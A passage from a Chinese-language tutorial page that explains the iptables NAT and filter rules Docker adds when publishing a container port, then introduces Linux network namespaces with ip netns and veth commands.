172.17.0.2:80</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">*filter</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:INPUT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ACCEPT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [138:7536]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:FORWARD</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DROP</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [0:0]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:OUTPUT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ACCEPT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [171:17544]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:DOCKER</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [0:0]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:DOCKER-ISOLATION-STAGE-1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [0:0]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:DOCKER-ISOLATION-STAGE-2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [0:0]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:DOCKER-USER</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [0:0]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FORWARD</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER-USER</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FORWARD</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER-ISOLATION-STAGE-1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FORWARD</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> conntrack</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --ctstate</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> RELATED,ESTABLISHED</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ACCEPT</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FORWARD</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FORWARD</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> !</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ACCEPT</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FORWARD</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ACCEPT</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 172.17.0.2/32</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> !</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tcp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tcp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --dport</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 80</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ACCEPT</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER-ISOLATION-STAGE-1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> !</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER-ISOLATION-STAGE-2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER-ISOLATION-STAGE-1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> RETURN</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER-ISOLATION-STAGE-2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DROP</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER-ISOLATION-STAGE-2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> RETURN</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER-USER</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> RETURN</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>diff</h2>
<p></p>
<p>我们会发现增加了3条规则</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">*nat</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># PREROUTING</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># DNAT 进入规则链进行改包dst 为目标地址</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> !</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tcp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tcp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --dport</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 80</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DNAT</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --to-destination</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 172.17.0.2:80</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#  80端口 MASQUERADE转换, SNAT</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> POSTROUTING</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 172.17.0.2/32</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 172.17.0.2/32</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tcp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tcp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --dport</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 80</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> MASQUERADE</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">*filter</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 默认转发规则会自动丢弃</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:FORWARD</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DROP</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [0:0]</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 若符合条件就让他转发， </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOCKER</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 172.17.0.2/32</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> !</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tcp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tcp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --dport</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 80</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ACCEPT</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h1>解释netns</h1>
<p>Linux 网络命名空间</p>
<p>Linux 命名空间 是 Docker 实现容器使用的底层技术之一，命名空间中有一种称为 网络命名空间 ，可用来实现容器间的网络隔离。</p>
<p>什么是网络命名空间，按照官方文档的说法：
1</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>A network namespace is logically another copy of the network stack, with its own routes, firewall rules, and network devices.</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>2</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>Network namespaces provide isolation of the system resources associated with networking: network devices, IPv4 and IPv6 protocol stacks, IP routing tables, firewall rules, the /proc/net directory (which is a symbolic link to /proc/PID/net), the</span></span>
<span class="line"><span>/sys/class/net directory, various files under /proc/sys/net, port numbers (sockets), and so on.</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>简单可以理解为系统刚启动时只有一个全局的网络命名空间，这个命名空间包含网络协议栈，网络接口，路由表，防火墙规则，以及一些网络配置等。</p>
<p>系统提供了 ip netns 命令可以用来添加新的网络命名空间。</p>
<p>初始时，没有其他的网络命名空间：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@ubuntu21:~#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> netns</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ls</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>我们现在来用 ip netns add 创建一个名为 netns0 的网络命名空间：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@ubuntu21:~#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> netns</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> netns0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@ubuntu21:~#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> netns</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ls</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">netns0</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>接着用 ip netns exec 命令在这个网络命名空间执行一些命令看下这个网络命名空间有什么东西：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@ubuntu21:~#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> netns</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> exec</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> netns0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lo:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">LOOPBAC</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">K&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 65536</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOWN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DEFAULT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/loopback</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@ubuntu21:~#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> netns</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> exec</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> netns0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> route</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Error:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ipv4:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FIB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> table</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> does</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> not</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> exist.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Dump</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> terminated</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@ubuntu21:~#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> netns</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> exec</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> netns0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iptables</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -L</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Chain</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> INPUT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (policy </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ACCEPT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">target</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     prot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> opt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> source</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">               destination</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">         </span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Chain</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FORWARD</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (policy </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ACCEPT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">target</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     prot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> opt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> source</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">               destination</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">         </span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Chain</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> OUTPUT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (policy </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ACCEPT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">target</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     prot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> opt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> source</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">               destination</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以看到这个命名空间</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>只有一个环回接口 lo。</span></span>
<span class="line"><span>路由表为空【将换回接口 lo up 后可以看到】。</span></span>
<span class="line"><span>iptables 规则为空。</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>与我们的全局网络命名空间完全不一样！</p>
<p>如下图所示：
在这里插入图片描述
上图中的根网络命名空间就是我们主机上的全局网络空间，有两个网口 lo 和 eth0，一套路由表和 iptables 规则。右边就是我们刚创建的 netns0 网络命名空间。</p>
<p>是不是很神奇？将网络命名空间和一个进程关联后，这个进程就拥有自己的网口，路由表，iptables 规则等，就像一个独立的系统一样，是不是我们就可以将它称为一个容器了？！没错，就是这样子！
将容器连接到主机</p>
<p>现在这个容器只有一个环回接口 lo，无法与主机通信，多没意思，我们来给它加一个网口。</p>
<p>先来创建一对虚拟以太网口【veth】：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@ubuntu21:~#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> veth0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> veth</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> peer</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ceth0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@ubuntu21:~#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ls</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lo:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">LOOPBACK,UP,LOWER_U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 65536</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noqueue</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UNKNOWN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DEFAULT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/loopback</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">...</span></span>
